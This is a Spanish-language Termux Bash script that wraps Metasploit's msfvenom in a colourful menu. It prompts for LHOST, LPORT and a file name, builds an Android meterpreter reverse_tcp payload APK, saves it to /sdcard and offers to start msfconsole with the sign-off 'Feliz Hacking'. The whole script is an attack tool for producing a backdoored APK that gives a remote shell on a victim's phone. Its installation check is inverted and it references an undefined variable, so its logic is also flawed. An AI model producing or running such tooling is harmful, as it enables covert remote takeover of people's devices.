#!/data/data/com.termux/files/usr/bin/bash

# CREADO POR EDGAR LUCK..[✓]

# COLORES

verde='\033[32m'
amarillo='\033[33m'
magenta='\033[1;35m'
rojo='\033[31m'
blanco='\033[37m'
cyan='\033[1;36m'

clear
sleep 1

SYSTEM=$(uname -o)

if [ "${SYSTEM}" == "Android" ]; then
        BIN="data/data/com.termux/files/usr/bin"
        APT="pkg"  
else
        BIN="/bin"
        APT="apt-get"
fi



# creando payload para andorid
echo -e ${blanco}"+                                                     +"
sleep 0.8
echo -e ${magenta}"+                       ++++++++++++                  +" 
sleep 0.6
echo -e ${verde}"+                       [BIENVENIDO]                  +"
sleep 0.6
echo -e ${magenta}"+                       ++++++++++++                  +"
sleep 0.6
echo -e ${blanco}"+                                                     +"
sleep 0.6
echo -e ${magenta}"+            +++++++++++++++++++++++++++++++++++      •"
sleep 0.6
echo -e ${verde}"+            [ Herramienta para crear payload  ]      +"
sleep 0.6
echo -e ${magenta}"+            +++++++++++++++++++++++++++++++++++      +"
echo ""
sleep 0.6
echo -e ${magenta}"+                      ++++++++++++++                 +"
sleep 0.6
echo -e ${verde}"+                      +Para Android+                 +"
sleep 0.6
echo -e ${magenta}"+                      ++++++++++++++                 +"
echo ""
sleep 0.6
echo -e ${verde}"       Elige una opcion :
	
	  [1] Payload para Android"
echo -e ${rojo}"          [2] Salir"${verde}

read -p ">>> " opcion

case $opcion in
	1)  


            sleep 2
                if [ ! -x ${bin}/msfvenom ]; then
                        echo -e ${verde}"
                Empezando...."${blanco}
                         sleep 2
                 else
                         echo -e ${rojo}"
           Lo sentimos no tiene instalado Metasploit :(
                         "${blanco}
                         exit 1
                fi
                sleep 1.5

	    echo -e ${verde}""
            echo -e -n ${cyan}"Digite tu LHOST:${verde} " 
            read -r LHOST
            sleep 2
	    echo ""
	    echo -e ${magenta}"Ejemplo${cyan}:${magenta} 4444"
            echo -e -n ${cyan}"Digite tu LPORT:${verde} " 
            read -r LPORT
            sleep 2
	    echo ""
	    echo -e ${magenta}"Ejemplo${cyan}:${magenta} Strike.apk"
	    echo -e -n ${cyan}"Nombre del apk:${verde} " 
            read -r apk
	    sleep 2
            echo ""
            echo -e ${verde}"[+]${blanco} Generando el Payload...."
            sleep 3
	    echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > /sdcard/"$apk"
            sleep 1
	    echo ""
	    echo -e ${verde}"[+]${blanco}Payload Generado"
	    sleep 3
	    echo ""
	    echo -e ${verde}"[+]${blanco}Guardado en la memoria interna"
	    sleep 3
	    echo ""
echo -e ${blanco}" ¿Ejecuto Metasploit?"
echo -e ${verde}"
[1]${blanco} Si"
echo ""
echo -e ${verde}"[2]${blanco} No"
echo ""
echo -e -n ${cyan}">>>${verde} "
read -r opcion

if [ "${opcion}" == "1" ]; then
        msfconsole
        echo -e ${verde}"Feliz Hacking ^_^"
        sleep 2.5
        exit
else
        echo ""
        echo -e ${verde}"Hasta luego ^_^"
        echo ""
        sleep 1.5
fi
        exit
;;
        2)
		echo -e ${verde}"Hasta Luego ^_^"
		sleep 2
esac
